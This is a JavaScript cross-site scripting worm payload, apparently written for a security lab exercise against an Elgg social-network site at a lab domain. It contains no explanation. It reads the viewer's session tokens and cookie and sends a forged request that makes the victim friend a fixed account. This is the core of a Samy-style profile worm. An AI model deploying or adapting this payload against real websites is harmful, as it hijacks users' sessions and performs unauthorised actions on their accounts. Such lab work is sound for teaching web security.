var hackbiji_worm = document.getElementById("worm").innerHTML;
alert(hackbiji_worm);
var user = elgg.session.user.username;
if(user!='hackbiji'){
    var victim = null;
    victim = new XMLHttpRequest();
    if(victim == null)
        alert("victim is null");
    victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
	victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.send();
}
